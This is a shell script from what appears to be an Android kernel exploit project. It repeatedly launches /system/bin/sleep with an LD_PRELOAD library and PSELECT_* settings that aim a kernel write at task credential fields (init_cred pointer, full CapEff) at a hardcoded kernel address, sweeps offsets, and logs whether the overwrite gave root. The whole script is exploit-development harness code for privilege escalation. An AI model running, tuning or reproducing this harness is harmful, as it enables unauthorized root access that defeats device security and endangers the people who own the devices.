#!/system/bin/sh
# E1: PC_OFF gradient mapping (mt72, 2026-09-02)
#
# Three fork rounds with PSELECT_PTR_PC_OFF sweep — maps where the main-tree
# erase ACTUALLY writes, independent of cred semantics:
#   0x770  R baseline replica (check *(0x780)=cred -> ne -> write 0x778)
#          EXPECTED LAND: CapEff full in child status (proven 7/7 geometry).
#   0x788  comm-write probe (check *(0x798)=comm tail=0 -> ne -> write 0x790
#          = comm[0..7] = init_cred ptr -> comm becomes 4 garbage bytes).
#          OBSERVABLE: /proc/<child>/comm corruption, no cred effects.
#   0x778  C replica (check *(0x788)=0 -> ne -> write 0x780 cred)
#          The failing geometry, now with comm + sampler forensics.
#
# Discrimination table (H hypotheses in CHECKPOINT §七):
#   0x770 lands && 0x788 corrupts comm && 0x778 no cred change
#     -> erase writes DO land at task+0x78X, but the 0x780 store specifically
#        gets neutralized after the fact (H3 rollback/clobber) -> E4 is right.
#   0x770 lands && 0x788 does NOT corrupt comm
#     -> erase not executing stores for pc>=0x778 geometry (H2 trigger chain)
#        -> E4 likely also fails; go read-only forensics.
#
# Each round: fresh process, fresh child, full 6-shot storm (no early abort
# signals expected except 0x770 R-semantics CapEff abort).
#
# Run via rish/Shizuku after deploying mt72 preload.so.
LOG=/data/local/tmp/E1_log.txt
echo "=== E1 gradient start $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id) ===" > $LOG

fire_e1(){ # off label stage
  OFF=$1; LBL=$2; STG=$3
  SNAP=/data/local/tmp/E1_${LBL}_snap.txt
  # 2026-09-03: load gate — refuse to fire while 1-min loadavg > 10.
# Starvation is self-induced by heavy D-state work under load; running
# during high load only wastes rounds and can cause soft-restart storms.
LOAD=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null || echo 0)
LOAD_INT=${LOAD%.*}
if [ "${LOAD_INT:-0}" -gt 10 ]; then
  echo "load gate: 1-min loadavg=$LOAD >10, refuse to run; wait for recovery"
  exit 2
fi

am kill-all 2>/dev/null
  rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt /data/local/tmp/E1_${LBL}.out $SNAP
  (while :; do
    for p in $(pgrep -f "sleep 180" 2>/dev/null); do
      echo "$(date +%H:%M:%S) pid=$p comm=$(cat /proc/$p/comm 2>/dev/null) state=$(cut -d' ' -f3 /proc/$p/stat 2>/dev/null) $(cat /data/local/tmp/mt49_child_status.txt 2>/dev/null)"
    done
    sleep 1
  done) > $SNAP 2>&1 &
  SMP=$!
  timeout 250 env \
    PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$STG \
    PSELECT_PTR_PC_OFF=$OFF \
    PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
    PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
    PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
    PSELECT_NO_CANARY=1 \
    LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 \
    > /data/local/tmp/E1_${LBL}.out 2>&1
  RC=$?
  kill $SMP 2>/dev/null
  echo "--- round PC_OFF=$OFF ($LBL) rc=$RC ---" >> $LOG
  cat /data/local/tmp/mt49_child_status.txt 2>/dev/null >> $LOG
  CPID=$(grep -a "mt33: child pid" /data/local/tmp/E1_${LBL}.out 2>/dev/null | tail -1 | sed 's/.*child pid=\([0-9]*\).*/\1/')
  echo "child pid=$CPID comm=$(cat /proc/$CPID/comm 2>/dev/null)" >> $LOG
  echo "child alive=$(kill -0 $CPID 2>/dev/null && echo yes || echo no)" >> $LOG
  grep -a "mt48: PTR\|mt51:\|mt25: futex trigger\|pselect returned\|mt47: ROOT-SEEN\|mt59: STALL\|mt66:" /data/local/tmp/E1_${LBL}.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -15 >> $LOG
  echo "sampler tail:" >> $LOG
  tail -8 $SNAP >> $LOG 2>/dev/null
  echo >> $LOG
  sleep 10
}

fire_e1 0x770 off770 R
fire_e1 0x788 off788 C
fire_e1 0x778 off778 C

echo "=== E1 done $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id) ===" >> $LOG
cat $LOG
